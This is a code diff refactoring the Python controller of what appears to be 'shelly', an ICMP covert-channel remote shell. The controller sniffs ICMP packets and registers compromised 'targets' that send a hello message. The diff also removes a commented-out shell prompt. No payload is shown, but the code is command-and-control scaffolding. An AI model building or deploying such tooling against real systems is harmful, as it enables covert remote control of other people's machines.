@@ -6,7 +6,7 @@ import socket
 import psutil
 import pwd
 import base64
-from multiprocessing import Process, Manager
+from multiprocessing import Manager, Process
 from multiprocessing.managers import BaseManager
 import json
 import ast
@@ -16,14 +16,14 @@ import shelly
 TTL = int(64)
 ICMP_ID = int(12800)
 
-class CustomManager(BaseManager):
-    pass
-
 class Controller(Host):
     
     def __init__(self):
         super().__init__()
         self.targets = []
+
+    def get_targets(self):
+        return self.targets
 
     def sniff_callback(self, packet):
         # Parses out things that shouldn't be there
@@ -45,7 +45,6 @@ class Controller(Host):
                 print("Default case")
 
     def join(self, shellpack):
-        
         match shellpack['message']:
             case "hello":
                 target = Target(shellpack)
@@ -59,37 +58,11 @@ class Controller(Host):
 
         return
 
-def sniffing(controller):
-     sniff(iface=controller.iface, filter="icmp", prn=controller.sniff_callback, store="0")
+if __name__ == "__main__":
 
-def setup_controller() -> Controller:
-    print("[ Setting up controller... ]")
+    print("[ Setting up controller ]")
     controller = Controller()
     print(controller)
 
-    return controller
-
-if __name__ == "__main__":
-    #BaseManager.register('Controller', Controller)
-    #manager = BaseManager()
-    #manager.start(#)
-    #controller = manager.Controller()
-
-    #print(controller)
-    
-    CustomManager.register('Controller', Controller)
-    with CustomManager() as manager:
-        # create a shared set instance
-        controller = manager.Controller()
-        # start some child processes
-        sniff_proc = Process(target=sniffing, args=(controller,))
-        #for process in processes:
-        sniff_proc.start()
-    #sniffing = Process(target=sniffing, args=(controller,))
-    #sniffing.start()
-    
-    #print("Starting listener")
-    #while True:
-    #    cmd = input("shelly > ")
-    #    if cmd == "ls":
-    #        print(controller.targets[0])
+    print("[ Starting sniffer ]")
+    sniff(iface=controller.iface, filter="icmp", prn=controller.sniff_callback, store="0")
